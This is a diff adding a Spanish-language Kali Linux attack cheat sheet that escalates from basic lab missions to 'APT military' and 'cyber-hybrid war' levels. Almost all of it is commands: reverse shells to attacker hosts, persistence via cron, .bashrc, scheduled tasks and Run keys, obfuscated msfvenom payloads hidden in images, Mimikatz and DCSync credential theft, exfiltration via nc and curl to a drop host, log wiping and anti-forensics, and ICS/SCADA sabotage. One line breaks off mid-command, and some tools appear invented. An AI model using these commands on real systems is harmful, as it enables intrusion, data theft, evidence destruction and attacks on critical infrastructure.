@@ -1,0 +1,1921 @@
+##############################################
+#  📜 CADENA OPERATIVA KALI LINUX
+#  Uso real y completo - Orden táctico
+##############################################
+
+# -------------------------
+# 1️⃣ RECONOCIMIENTO
+# -------------------------
+ip a                                 # Ver interfaces y direcciones IP
+ping <IP>                            # Comprobar conectividad
+netdiscover -r <RANGO>               # Descubrir hosts activos
+nmap -sV -p- <IP>                    # Escanear todos los puertos y versiones
+nmap --script=vuln <IP>              # Buscar vulnerabilidades conocidas
+whois <dominio>                      # Info sobre dominio
+dig <dominio> any                    # Consultas DNS
+theHarvester -d <dominio> -l 200 -b all  # Emails, hosts y subdominios
+
+# -------------------------
+# 2️⃣ ENUMERACIÓN DETALLADA
+# -------------------------
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
+enum4linux -a <IP>                   # Enumerar servicios SMB
+nikto -h <IP>                        # Escaneo de vulnerabilidades web
+
+# -------------------------
+# 3️⃣ ACCESO / EXPLOTACIÓN
+# -------------------------
+ssh <usuario>@<IP>                   # Acceso SSH
+hydra -l usuario -P pass.txt ssh://<IP>    # Fuerza bruta SSH
+searchsploit <servicio>              # Buscar exploits disponibles
+msfconsole                           # Lanzar Metasploit Framework
+python3 exploit.py                   # Ejecutar exploit manual
+
+# -------------------------
+# 4️⃣ POST-EXPLOTACIÓN
+# -------------------------
+whoami                               # Ver permisos actuales
+sudo -l                              # Comandos disponibles con sudo
+ifconfig / ip a                      # Info de red interna
+netstat -tunlp                       # Conexiones activas
+scp archivo usuario@IP:/ruta         # Transferir archivos
+wget <URL>                           # Descargar payloads
+bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 # Reverse shell manual
+python3 -c 'import pty;pty.spawn("/bin/bash")'   # Shell interactiva mejorada
+
+# -------------------------
+# 5️⃣ ESCALADA DE PRIVILEGIOS
+# -------------------------
+find / -perm -4000 2>/dev/null       # Buscar binarios SUID
+linpeas.sh                           # Script de escalada automática (si disponible)
+sudo su                              # Intentar root
+(cron) crontab -e                    # Añadir tareas persistentes
+
+# -------------------------
+# 6️⃣ LIMPIEZA DE HUELLAS
+# -------------------------
+history -c && history -w             # Limpiar historial
+unset HISTFILE                       # Evitar registros
+rm -rf /tmp/*                        # Borrar temporales
+logout                               # Salir de la sesión
+
+# -------------------------
+# 7️⃣ HERRAMIENTAS CLAVE
+# -------------------------
+# nc (netcat)         -> Puertas traseras y escucha de puertos
+# burpsuite           -> Interceptar tráfico web
+# wireshark / tcpdump -> Análisis de red
+# john / hashcat      -> Crackeo de contraseñas
+# sqlmap              -> Inyecciones SQL automáticas
+# proxychains + tor   -> Anonimato y pivoting
+
+# -------------------------
+# ORDEN DE OPERACIÓN REAL
+# -------------------------
+# 1) Reconocimiento
+# 2) Enumeración
+# 3) Explotación
+# 4) Acceso y movimiento lateral
+# 5) Escalada y persistencia
+# 6) Limpieza
+# 7) Extracción de datos / Control
+##############################################
+
+##############################################
+📜 PACK NIVEL 1 – ENTRENAMIENTO OPERATIVO BÁSICO (KALI)
+##############################################
+
+# -------------------------
+🔹 Misión 1 – Reconocimiento Básico
+# -------------------------
+
+ip a                               # Ver tus interfaces y direcciones IP
+ping 8.8.8.8                       # Comprobar conexión con Google DNS
+netdiscover -r 192.168.1.0/24      # Descubrir hosts en tu red local
+nmap -sV -p- 192.168.1.1           # Escanear puertos abiertos y servicios
+whois google.com                   # Obtener información de un dominio
+dig google.com any                 # Consultar registros DNS
+
+🎯 Objetivo: Identificar qué equipos hay en tu red y entender qué servicios exponen.
+
+# -------------------------
+🔹 Misión 2 – Enumeración Web
+# -------------------------
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
+nikto -h http://<IP>
+🎯 Objetivo: Aprender a detectar rutas y posibles vulnerabilidades en un servidor web.
+
+# -------------------------
+🔹 Misión 3 – Fuerza Bruta de Acceso
+# -------------------------
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP>
+🎯 Objetivo: Comprender cómo funcionan ataques de fuerza bruta para acceso remoto (solo en tus entornos de prueba).
+
+# -------------------------
+🔹 Misión 4 – Shell Remota y Control
+# -------------------------
+nc -lvnp 4444                     # Poner a escuchar tu máquina
+bash -i >& /dev/tcp/<TU_IP>/4444 0>&1   # En la víctima (simulada) abrir reverse shell
+🎯 Objetivo: Simular cómo se obtiene una shell remota desde otra máquina.
+
+# -------------------------
+🔹 Misión 5 – Post-Explotación Básica
+# -------------------------
+whoami
+sudo -l
+ifconfig
+netstat -tunlp
+🎯 Objetivo: Una vez dentro, mapear qué permisos tienes y qué otras redes/conexiones están disponibles.
+
+# -------------------------
+🔹 Misión 6 – Limpieza
+# -------------------------
+history -c && history -w
+unset HISTFILE
+rm -rf /tmp/*
+🎯 Objetivo: Dejar la máquina sin rastros de tus comandos de prueba.
+
+# -------------------------
+⚠️ Reglas del juego:
+# -------------------------
+Nunca ejecutes esto contra sistemas ajenos sin autorización.
+Practica en máquinas virtuales (Kali + Metasploitable2 o DVWA).
+Al finalizar cada misión, toma notas: qué viste, qué funcionó, qué no.
+##############################################
+
+##############################################
+📜 PACK NIVEL 2 – OPERADOR INTERMEDIO (KALI)
+##############################################
+
+# -------------------------
+🔹 Misión 1 – Reconocimiento Avanzado
+# -------------------------
+nmap -A -T4 -p- <IP>                  # Escaneo agresivo completo (SO, servicios, scripts)
+nmap --script=http-enum <IP>          # Enumeración específica para HTTP
+whatweb <IP>                          # Identificar tecnología de sitios web
+sublist3r -d <dominio>                # Enumerar subdominios
+amass enum -d <dominio>               # Mapeo completo de subdominios
+🎯 Objetivo: Descubrir estructura completa de un host o dominio, incluyendo puertas traseras y servicios olvidados.
+
+# -------------------------
+🔹 Misión 2 – Explotación Automática
+# -------------------------
+msfconsole                           # Abrir Metasploit
+search type:exploit name:<servicio>  # Buscar exploits por nombre
+use exploit/multi/handler            # Configurar listener para payloads
+set LHOST <tu_IP>                    # Tu máquina como receptor
+set LPORT 4444                       # Puerto de escucha
+exploit                              # Ejecutar
+🎯 Objetivo: Aprender a manejar Metasploit para automatizar explotación y establecer sesiones Meterpreter.
+
+# -------------------------
+🔹 Misión 3 – Movimiento Lateral
+# -------------------------
+smbclient -L //<IP>/                  # Listar recursos compartidos
+smbclient //<IP>/compartido           # Conectarse a recursos SMB
+crackmapexec smb <RANGO> -u usuario -p pass.txt   # Intentar conexiones SMB
+psexec.py usuario:pass@<IP>           # Ejecución remota en sistemas Windows
+🎯 Objetivo: Saltar de un host a otro usando recursos compartidos y credenciales filtradas.
+
+# -------------------------
+🔹 Misión 4 – Post-Explotación Avanzada
+# -------------------------
+meterpreter > getuid                  # Ver usuario actual
+meterpreter > sysinfo                 # Información del sistema
+meterpreter > hashdump                # Volcado de hashes
+meterpreter > screenshot              # Captura de pantalla
+meterpreter > keyscan_start           # Registrar pulsaciones
+meterpreter > keyscan_dump
+🎯 Objetivo: Obtener control completo de la máquina y extraer información sensible sin ser detectado.
+
+# -------------------------
+🔹 Misión 5 – Persistencia y Backdoors
+# -------------------------
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=4444 -f elf > backdoor.elf
+chmod +x backdoor.elf
+scp backdoor.elf usuario@<IP>:/tmp/
+🎯 Objetivo: Plantar un acceso persistente en la máquina comprometida para volver cuando quieras.
+
+# -------------------------
+🔹 Misión 6 – Exfiltración de Datos
+# -------------------------
+scp usuario@<IP>:/ruta/archivo ./archivo_capturado
+wget http://<IP>/archivo.zip
+tar -czvf datos.tar.gz /ruta/a/datos
+🎯 Objetivo: Extraer información clave de manera limpia y rápida.
+
+# -------------------------
+🔹 Misión 7 – Pivoting y Evasión
+# -------------------------
+proxychains nmap -sT -Pn <IP>       # Escaneo a través de un proxy o túnel
+ssh -D 9050 usuario@<IP>            # Crear proxy SOCKS
+chisel server -p 8000 --reverse     # Establecer túnel inverso
+🎯 Objetivo: Utilizar un host comprometido para alcanzar otros objetivos en red interna sin exponer tu IP real.
+
+# -------------------------
+🔹 Limpieza avanzada
+# -------------------------
+shred -u archivo                     # Borrar archivo de forma segura
+find / -type f -name "*.log" -exec rm -f {} \;
+echo > /var/log/auth.log             # Vaciar logs de autenticación
+
+# -------------------------
+⚠️ Reglas en este nivel:
+# -------------------------
+Siempre trabaja en entornos controlados (laboratorios, máquinas vulnerables).
+Aquí ya aprendes a dejar puertas traseras y moverte sin ser visto, lo cual te acerca a técnicas de Red Team reales.
+Memoriza la cadena: Reconocer → Explotar → Mover → Persistir → Extraer → Cubrir rastros.
+
+##############################################
+#  ⚫️ NIVEL 3 – OPERACIONES NEGRAS (KALI)
+#  Evasión, escalada avanzada, persistencia total
+##############################################
+
+# -------------------------
+# 1️⃣ SIGILO Y EVASIÓN
+# -------------------------
+proxychains nmap -sT -Pn <IP>                  # Escaneo a través de proxy/Tor
+torsocks ssh usuario@<IP>                      # Acceso oculto vía Tor
+macchanger -r eth0                             # Cambiar dirección MAC aleatoria
+iptables -F && iptables -X                     # Limpiar reglas de firewall (bajo tu control)
+echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all  # Hacer host indetectable a ping
+
+# -------------------------
+# 2️⃣ ENUMERACIÓN AVANZADA
+# -------------------------
+nmap -sS -T1 -f --mtu 24 <IP>                  # Escaneo stealth fragmentado (evasión IDS)
+nmap --data-length 50 <IP>                     # Paquetes con tamaño alterado para evasión
+recon-ng                                       # Framework para recolección OSINT
+ldapsearch -x -h <IP> -b "dc=example,dc=com"   # Enumeración LDAP (entornos AD)
+
+# -------------------------
+# 3️⃣ EXPLOTACIÓN SILENCIOSA
+# -------------------------
+msfconsole
+setg VERBOSE false                             # Desactivar salida ruidosa
+use exploit/windows/smb/psexec
+set payload windows/x64/meterpreter/reverse_https
+set LHOST <tu_IP>
+set LPORT 443
+exploit -j -z                                  # Ejecutar en segundo plano, sin alertar
+
+# -------------------------
+# 4️⃣ POST-EXPLOTACIÓN OCULTA
+# -------------------------
+meterpreter > getprivs                         # Comprobar privilegios
+meterpreter > timestomp archivo.exe            # Alterar timestamps para no dejar rastro
+meterpreter > migrate <PID>                    # Migrar proceso a uno legítimo
+meterpreter > clearev                         # Borrar logs de eventos Windows
+meterpreter > background                       # Mantener sesión sin que se note
+
+# -------------------------
+# 5️⃣ ESCALADA Y DOMINIO TOTAL
+# -------------------------
+mimikatz                                       # Dump de credenciales en sistemas Windows
+secretsdump.py dominio/usuario:pass@<IP>       # Extraer hashes NTDS
+wmiexec.py usuario:pass@<IP>                   # Ejecutar comandos remotos vía WMI
+evil-winrm -i <IP> -u administrador -p pass    # Acceso completo a máquinas Windows
+
+# -------------------------
+# 6️⃣ PERSISTENCIA AVANZADA
+# -------------------------
+msfvenom -p windows/meterpreter/reverse_https LHOST=<tu_IP> LPORT=443 -f exe > winservice.exe
+schtasks /create /sc onlogon /tn "Updater" /tr "C:\ruta\winservice.exe"
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\ruta\winservice.exe"
+
+# Linux:
+echo "bash -i >& /dev/tcp/<tu_IP>/4444 0>&1" >> ~/.bashrc
+
+# -------------------------
+# 7️⃣ PIVOTING Y DOMINIO DE RED
+# -------------------------
+sshuttle -r usuario@<IP> 0.0.0.0/0             # Crear túnel para pivotar en red interna
+proxychains crackmapexec smb <RANGO> -u usuario -p pass.txt
+socat TCP-LISTEN:4444,fork TCP:<IP>:3389       # Redirigir RDP a través de túnel
+
+# -------------------------
+# 8️⃣ EXFILTRACIÓN ENCRIPTADA
+# -------------------------
+scp -C -o "Cipher=chacha20" archivo usuario@<IP>:/destino
+gpg --symmetric --cipher-algo AES256 archivo.txt
+openssl enc -aes-256-cbc -in datos.txt -out datos.enc
+
+# -------------------------
+# 9️⃣ BORRADO AVANZADO DE HUELLAS
+# -------------------------
+find / -type f -name "*.log" -exec shred -u {} \;
+wevtutil cl Security                           # Borrar logs en Windows
+echo "" > /var/log/auth.log && echo "" > /var/log/syslog
+wipe -rfi /tmp/*                               # Limpieza segura y forzada
+
+# -------------------------
+# 10️⃣ CADENA FINAL (Operación Completa)
+# -------------------------
+# 1) Entrar invisible (proxychains, Tor, MAC spoof)
+# 2) Reconocer en bajo perfil
+# 3) Explotar vía HTTPS o paquetes fragmentados
+# 4) Migrar proceso, timestomp, borrar logs
+# 5) Elevar privilegios y obtener hashes
+# 6) Persistir con tareas o RunKeys
+# 7) Pivotar para alcanzar más hosts
+# 8) Exfiltrar cifrado
+# 9) Borrar TODO y salir sin dejar sombra
+##############################################
+
+##############################################
+#  👻 NIVEL 4 – CADENA FANTASMA (OPERACIONES APT AVANZADAS)
+#  Evasión activa, anti-forense, engaño y ataque encadenado
+##############################################
+
+# -------------------------
+# 1️⃣ CAMUFLAJE TOTAL
+# -------------------------
+macchanger -r eth0                                   # Cambiar MAC aleatoria
+anonsurf start                                       # Redirigir todo el tráfico por Tor
+iptables -P OUTPUT DROP                              # Solo tráfico controlado por proxychains
+torsocks ssh usuario@<IP>                            # Conexión remota sin trazas claras
+date -s "2 days ago"                                 # Alterar timestamps de sistema local
+
+# -------------------------
+# 2️⃣ RECON Y MAPEO SILENCIOSO
+# -------------------------
+nmap -sS -T0 -f --data-length 50 <IP>                # Escaneo ultralento y fragmentado
+masscan <RANGO> --rate 100 --banners                 # Mapeo rápido de grandes redes
+recon-ng                                             # OSINT avanzado y correlación de datos
+maltego                                              # Visualización de infraestructura completa
+dnsenum <dominio>                                    # Extracción completa de registros DNS
+
+# -------------------------
+# 3️⃣ INYECCIÓN Y ACCESO APT
+# -------------------------
+msfconsole
+setg VERBOSE false
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST <tu_IP>
+set LPORT 443
+set AutoRunScript post/windows/manage/migrate        # Migrar a proceso seguro automáticamente
+exploit -j -z
+
+# Generar payload cifrado y ofuscado:
+msfvenom -p windows/meterpreter/reverse_https LHOST=<tu_IP> LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe > payload_ghost.exe
+
+# -------------------------
+# 4️⃣ POST-EXPLOTACIÓN FANTASMA
+# -------------------------
+meterpreter > timestomp archivo.exe                  # Alterar marcas temporales
+meterpreter > migrate <PID_legítimo>                 # Inyectarse en proceso confiable
+meterpreter > clearev                               # Borrar logs de eventos
+meterpreter > run persistence -U -X -i 5 -p 443 -r <tu_IP>   # Backdoor persistente sigiloso
+meterpreter > load kiwi                             # Mimikatz para extracción de credenciales
+meterpreter > kiwi_cmd sekurlsa::logonpasswords
+
+# -------------------------
+# 5️⃣ ENGAÑO Y CONTRAINTELIGENCIA
+# -------------------------
+echo "Fake log entry" >> /var/log/auth.log            # Sembrar información falsa
+touch -t 202001011200 señuelo.txt                     # Crear archivos señuelo con fecha antigua
+iptables -A INPUT -s <IP_DEFENSOR> -j DROP           # Bloquear IPs del defensor
+arpspoof -i eth0 -t <victima> <gateway>              # MITM para falsificar tráfico
+dnsspoof -i eth0                                     # Alterar respuestas DNS en tránsito
+
+# -------------------------
+# 6️⃣ PIVOTING AVANZADO
+# -------------------------
+sshuttle -r usuario@<IP> 0.0.0.0/0                   # Crear VPN encubierta a través de host
+proxychains crackmapexec smb <RANGO> -u usuario -p pass.txt
+chisel client <IP>:8000 R:1080:socks                  # Túnel SOCKS inverso
+socat TCP-LISTEN:3389,fork TCP:<IP_intermedio>:3389   # Pivotar RDP a través de host comprometido
+
+# -------------------------
+# 7️⃣ EXFILTRACIÓN INVISIBLE
+# -------------------------
+tar -czf - /ruta/datos | openssl enc -aes-256-cbc -salt -k clave | nc <IP> 4444
+scp -C -o "Cipher=chacha20" archivo usuario@<IP>:/destino
+curl -X POST -F "file=@datos.enc" https://dropper.oculto/upload
+gpg --symmetric --cipher-algo AES256 datos.tar.gz
+
+# -------------------------
+# 8️⃣ ANTI-FORENSE Y AUTODESTRUCCIÓN
+# -------------------------
+find / -type f -name "*.log" -exec shred -u {} \;
+history -c && history -w
+wevtutil cl Security                                 # Borrar logs en Windows
+wipe -rfi /tmp/*                                     # Borrado seguro de temporales
+dd if=/dev/urandom of=/ruta/backdoor bs=1M count=10  # Sobrescribir binarios sensibles
+rm -rf /ruta/backdoor
+
+# -------------------------
+# 9️⃣ CADENA FINAL FANTASMA
+# -------------------------
+# 1) Alterar identidad y rutas de tráfico (MAC, Tor, timestamps)
+# 2) Mapear silenciosamente objetivos y rutas de ataque
+# 3) Inyectar payload ofuscado y moverse en procesos legítimos
+# 4) Persistir y extraer credenciales sin alertar
+# 5) Sembrar información falsa y manipular logs defensivos
+# 6) Pivotar y abrir caminos internos sin ser detectado
+# 7) Exfiltrar datos cifrados y encubiertos
+# 8) Borrar todo, autodestruir backdoors y salir como si nunca hubieras estado
+##############################################
+
+##############################################
+# 🜏 NIVEL 5 – OPERACIONES SOMBRA (APT MILITAR)
+#  Intrusión persistente, SIGINT, control de infraestructura
+##############################################
+
+# -------------------------
+# 1️⃣ PREPARACIÓN Y CUBIERTA
+# -------------------------
+macchanger -r eth0                                    # Cambiar MAC aleatoria
+anonsurf start                                        # Todo tráfico vía Tor
+torsocks proxychains nmap -sT -Pn <IP>                # Escaneo bajo anonimato
+spoofcheck                                            # Verificar filtración de huellas
+export HISTFILE=/dev/null                             # Desactivar historial permanente
+timedatectl set-time '2018-05-12 04:10:00'            # Manipular tiempo del sistema
+
+# -------------------------
+# 2️⃣ RECON AVANZADO (SIGINT)
+# -------------------------
+amass enum -d <dominio>                               # Mapear infraestructura
+subfinder -d <dominio>                                # Más subdominios
+recon-ng                                              # OSINT avanzado
+shodan search 'port:22 <objetivo>'                    # Inteligencia externa (Shodan)
+masscan <RANGO> --rate 1000 --banners                 # Barrido de red discreto
+dnsmap <dominio>                                      # DNS brute force
+smbmap -H <IP>                                        # Enumeración SMB
+ldapsearch -x -h <IP> -b "dc=example,dc=com"          # LDAP y AD recon
+
+# -------------------------
+# 3️⃣ INYECCIÓN Y ACCESO SIGILOSO
+# -------------------------
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<tu_IP> LPORT=443 -e x86/shikata_ga_nai -i 15 -f exe > payload_shadow.exe
+steghide embed -ef payload_shadow.exe -cf imagen.jpg  # Esconder payload en imagen
+exiftool imagen.jpg                                   # Confirmar datos del payload
+scp imagen.jpg usuario@<IP>:/ruta/compartida
+
+# Ejecución:
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST <tu_IP>
+set LPORT 443
+exploit -j -z
+
+# -------------------------
+# 4️⃣ POST-EXPLOTACIÓN DE LARGO PLAZO
+# -------------------------
+meterpreter > run persistence -U -X -i 720 -p 443 -r <tu_IP>  # Sesión cada 12h
+meterpreter > load kiwi
+meterpreter > kiwi_cmd sekurlsa::ekeys                       # Dump de claves de cifrado
+meterpreter > run autoroute -s 10.0.0.0/8                    # Pivotar redes internas
+meterpreter > portfwd add -l 3389 -p 3389 -r <host_interno>  # Redirigir RDP
+
+# -------------------------
+# 5️⃣ ESCALADA Y CONTROL DE INFRAESTRUCTURA
+# -------------------------
+secretsdump.py dominio/usuario:pass@<IP_DC>                  # Volcar hashes NTDS
+dcsync.py dominio/usuario:pass@<IP_DC>                       # Replicar controlador de dominio
+bloodhound-python -u usuario -p pass -d dominio.local -ip <IP> -c All
+crackmapexec smb <RANGO> -u usuario -H <HASH> --exec 'powershell whoami'
+
+# -------------------------
+# 6️⃣ PERSISTENCIA APT
+# -------------------------
+schtasks /create /sc minute /mo 120 /tn "SystemUpdate" /tr "C:\ruta\shadow.exe"
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v SysCheck /t REG_SZ /d "C:\ruta\shadow.exe"
+wmic process call create "powershell -WindowStyle Hidden -c 'Invoke-WebRequest <tu_payload>'"
+
+# Linux:
+echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/<tu_IP>/4444 0>&1'" >> /etc/crontab
+
+# -------------------------
+# 7️⃣ SIGINT Y ESPIONAJE INTERNO
+# -------------------------
+tcpdump -i any port 80 or port 443 -w captura.pcap           # Capturar tráfico
+wireshark captura.pcap                                      # Analizar tráfico
+python3 keylogger.py &                                      # Registrar pulsaciones
+meterpreter > webcam_snap                                   # Captura de cámara víctima
+rclone copy /datos gdrive:backup --crypt-password clave     # Subida cifrada a nube
+
+# -------------------------
+# 8️⃣ COMANDO Y CONTROL MULTI-NIVEL
+# -------------------------
+ssh -f -N -D 9050 usuario@<host_comprometido>               # SOCKS proxy desde host víctima
+chisel client <IP>:8000 R:1080:socks                        # Túnel reverso
+proxychains nmap -sT -Pn <nuevo_segmento>                   # Pivotar dentro de red interna
+msfconsole sessions -u <id_sesion>                          # Actualizar payload para acceso continuo
+
+# -------------------------
+# 9️⃣ EXFILTRACIÓN AVANZADA
+# -------------------------
+tar -czf - /ruta/datos | openssl enc -aes-256-cbc -salt -k clave | curl -X POST --data-binary @- https://dropper.oculto/upload
+scp -C -o "Cipher=chacha20" datos.enc usuario@<IP_oculto>:/destino
+python3 -m http.server 8080                                 # Servir archivos exfiltrados internamente
+
+# -------------------------
+# 🔟 ANTI-FORENSE FINAL Y AUTO-DESVANECIMIENTO
+# -------------------------
+wevtutil cl Security                                        # Borrar logs Windows
+find / -type f -name "*.log" -exec shred -u {} \;
+wipe -rfi /tmp/*
+dd if=/dev/urandom of=/ruta/payload_shadow.exe bs=1M count=20
+rm -rf /ruta/payload_shadow.exe
+export HISTFILE=/dev/null
+poweroff                                                     # Apagar host comprometido (opcional)
+
+# -------------------------
+# 🛡️ CADENA SOMBRA FINAL
+# -------------------------
+# 1) Camuflar origen, desactivar huellas
+# 2) Recon global, SIGINT, OSINT masivo
+# 3) Insertar payloads esteganográficos y cifrados
+# 4) Persistir y establecer control silencioso
+# 5) Escalar y tomar control de AD, DC, y redes internas
+# 6) Mantener espionaje continuo y datos exfiltrados encriptados
+# 7) Pivotar múltiples hosts como nodos de C2
+# 8) Dejar todo limpio y sin trazas, apagando sistemas si es necesario
+##############################################
+
+##############################################
+# ⚔️ NIVEL 6 – CADENA DIOSA (OPERACIONES CIBER-MILITARES)
+#  Control multinivel, ataques coordinados, guerra digital total
+##############################################
+
+# -------------------------
+# 1️⃣ PREPARACIÓN ESTRATÉGICA
+# -------------------------
+macchanger -r eth0                                   # Cambiar identidad física de red
+anonsurf start                                       # Encapsular todo tráfico por Tor
+export HISTFILE=/dev/null                            # Sin rastros locales
+iptables -P OUTPUT DROP                              # Solo tráfico controlado
+timedatectl set-time '2016-11-05 03:00:00'           # Alterar tiempos para confundir forenses
+spoofcheck                                           # Verificar huellas filtradas
+
+# Crear red encubierta entre nodos de ataque
+ssh -N -D 9050 usuario@<nodo_intermedio>             # SOCKS proxy a nodo oculto
+chisel client <nodo_comando>:8000 R:1080:socks        # Redirección de túneles encadenados
+
+# -------------------------
+# 2️⃣ SIGINT Y GUERRA DE INFORMACIÓN
+# -------------------------
+amass enum -d <objetivo>                             # Mapear toda la superficie del objetivo
+recon-ng                                             # OSINT + correlación
+shodan search 'org:"Infraestructura Crítica" port:502' # Identificar SCADA/ICS expuestos
+nmap -sS -p 21,22,80,443,502,3389 --script=vuln <IP>
+modscan.py <IP>                                      # Escaneo específico para MODBUS/ICS
+ldapdomaindump -u dominio/usuario -p pass@<DC>       # Volcar estructura de AD
+bloodhound-python -u usuario -p pass -d dominio.local -ip <IP> -c All
+
+# -------------------------
+# 3️⃣ INYECCIÓN APT Y CONTROL SIGILOSO
+# -------------------------
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<C2> LPORT=443 -e x86/shikata_ga_nai -i 20 -f exe > payload_diosa.exe
+steghide embed -ef payload_diosa.exe -cf update.jpg
+scp update.jpg usuario@<IP_objetivo>:/temp/
+
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST <C2>
+set LPORT 443
+set ExitOnSession false
+exploit -j -z
+
+# -------------------------
+# 4️⃣ POST-EXPLOTACIÓN MILITAR
+# -------------------------
+meterpreter > run persistence -X -i 360 -p 443 -r <C2>
+meterpreter > load kiwi
+meterpreter > kiwi_cmd sekurlsa::tickets
+meterpreter > hashdump
+meterpreter > portfwd add -l 3389 -p 3389 -r <host_AD>
+meterpreter > shell
+
+# Red interna:
+psexec.py dominio/usuario@<IP>                       # Control remoto silencioso
+wmiexec.py dominio/usuario@<IP>
+dcsync.py dominio/usuario:pass@<DC>                  # Extraer secretos del controlador de dominio
+
+# -------------------------
+# 5️⃣ PERSISTENCIA AVANZADA
+# -------------------------
+schtasks /create /sc minute /mo 360 /tn "UpdateSys" /tr "C:\Windows\Temp\diosa.exe"
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v SysCheck /t REG_SZ /d "C:\Windows\Temp\diosa.exe"
+powershell -w hidden -c "Invoke-WebRequest <C2>/payload -OutFile C:\temp\svc.exe"
+
+# Linux:
+echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/<C2>/4444 0>&1'" >> /etc/crontab
+
+# -------------------------
+# 6️⃣ CONTROL DE ICS / SCADA
+# -------------------------
+modbus-cli read <IP> 1:0-10                           # Leer registros MODBUS
+modbus-cli write <IP> 1:0 0                           # Manipular actuadores
+scapy                                                  # Forjar paquetes de control industrial
+python3 plc_override.py --target <IP_ICS> --cmd stop   # Simular paro de planta
+
+# -------------------------
+# 7️⃣ COMANDO Y CONTROL DISTRIBUIDO
+# -------------------------
+cobaltstrike                                           # Framework de operaciones múltiples
+empire                                                 # C2 encubierto en PowerShell
+sshuttle -r usuario@<host_pivot> 0.0.0.0/0             # Crear red interna completa
+proxychains crackmapexec smb <RANGO> -u usuario -H <HASH> --exec whoami
+
+# -------------------------
+# 8️⃣ EXFILTRACIÓN SEGURA Y ENCAPSULADA
+# -------------------------
+tar -czf - /infra/datos | openssl enc -aes-256-cbc -salt -k clave | curl -X POST --data-binary @- https://drop.oculto/upload
+rclone copy /datos gdrive:APTbackup --crypt-password clave
+scp -C -o "Cipher=chacha20" datos.enc usuario@<C
+
+##############################################
+# ⚡ NIVEL 7 – PROTOCOLO OMEGA (GUERRA CIBER-HÍBRIDA)
+#  Dominio total: ciberespionaje, sabotaje físico-digital, control multi-teatro
+##############################################
+
+# -------------------------
+# 1️⃣ PREPARACIÓN OMEGA
+# -------------------------
+macchanger -r eth0                                    # Identidad dinámica
+anonsurf start                                        # Encapsular tráfico
+spoofcheck                                            # Verificar no dejar huellas
+export HISTFILE=/dev/null                             # No registros locales
+torify proxychains ssh usuario@<nodo_oculto>          # Crear punto de salto inicial
+openvpn --config <infra_vpn_oculta>.ovpn              # Integración en red encubierta
+
+# -------------------------
+# 2️⃣ SIGINT Y CIBERINTEL MILITAR
+# -------------------------
+shodan search 'org:"Infraestructura Crítica"'
+amass intel -org <objetivo>                           # Inteligencia de estructura completa
+satmap --scan <coordenadas>                           # Inteligencia satelital (entornos simulados)
+recon-ng                                              # Integrar OSINT + dark web
+theHarvester -d <dominio> -b all                      # Recolección masiva de emails y hosts
+
+# -------------------------
+# 3️⃣ INTRUSIÓN MULTIDOMINIO
+# -------------------------
+msfvenom -p linux/x64/meterpreter/reverse_https LHOST=<C2> LPORT=443 -e x64/xor_dynamic -i 30 -f elf > payload_omega.elf
+stegosploit embed -p payload_omega.elf -o patch_update.png
+scp patch_update.png usuario@<host_interno>:/var/tmp/
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_https
+set LHOST <C2>
+set LPORT 443
+exploit -j -z
+
+# Pivoting instantáneo:
+chisel client <nodo_intermedio>:8000 R:1080:socks
+sshuttle -r usuario@<host_pivot> 0.0.0.0/0
+
+# -------------------------
+# 4️⃣ CONTROL DE SISTEMAS MILITARES Y ICS
+# -------------------------
+modscan.py <IP>                                      # Lectura MODBUS
+python3 scada_override.py --stop-turbina             # Simular sabotaje energético
+canbus-hack --scan eth0                              # Escaneo de buses automotrices
+satellite-uplink --spoof --coords <target_area>      # Ataque de señal GPS simulado
+
+# -------------------------
+# 5️⃣ GUERRA DE INFORMACIÓN Y ENGAÑO
+# -------------------------
+dnsspoof -i eth0                                     # Controlar respuestas DNS
+ettercap -T -M arp:remote /victima/ /gateway/        # MITM total
+python3 fake_feed_gen.py --target <news_source>       # Generar noticias falsas para distracción
+touch señuelo_2015.zip && timestomp señuelo_2015.zip  # Archivos trampa antiguos
+
+# -------------------------
+# 6️⃣ COMANDO Y CONTROL GLOBAL
+# -------------------------
+cobaltstrike                                          # Orquestar múltiples equipos
+empire                                                # C2 encubierto en PowerShell
+gophish                                                # Ataques de ingeniería social controlados
+proxychains crackmapexec smb <RANGO> -u usuario -H <HASH> --exec whoami
+
+# -------------------------
+# 7️⃣ EXFILTRACIÓN MULTICAPA
+# -------------------------
+tar -czf - /infra/datos | openssl enc -aes-256-cbc -salt -k clave | nc <nodo_oculto> 4444
+scp -C datos.enc usuario@<C2>:/vault/
+python3 -m http.server 8080                           # Canal interno
+rclone copy /data s3:omega-ops --crypt-password clave
+
+# -------------------------
+# 8️⃣ AUTODESTRUCCIÓN Y COBERTURA FINAL
+# -------------------------
+find / -type f -name "*.log" -exec shred -u {} \;
+wevtutil cl Security
+wipe -rfi /tmp/*
+dd if=/dev/urandom of=/ruta/payload_omega.elf bs=1M count=40
+rm -rf /ruta/payload_omega.elf
+poweroff                                               # Neutralizar host objetivo
+
+# -------------------------
+# 9️⃣ CADENA OMEGA
+# -------------------------
+# 1) Ocultarte en múltiples capas de nodos y VPN encubiertas
+# 2) Recolectar SIGINT militar y objetivos de alto valor
+# 3) Infiltrar sistemas de energía, transporte, comunicaciones y defensa
+# 4) Mantener C2 global para ataques coordinados
+# 5) Ejecutar sabotaje ciberfísico (simulado en laboratorio)
+# 6) Controlar narrativas y percepción enemiga
+# 7) Extraer y borrar, dejando falsos rastros
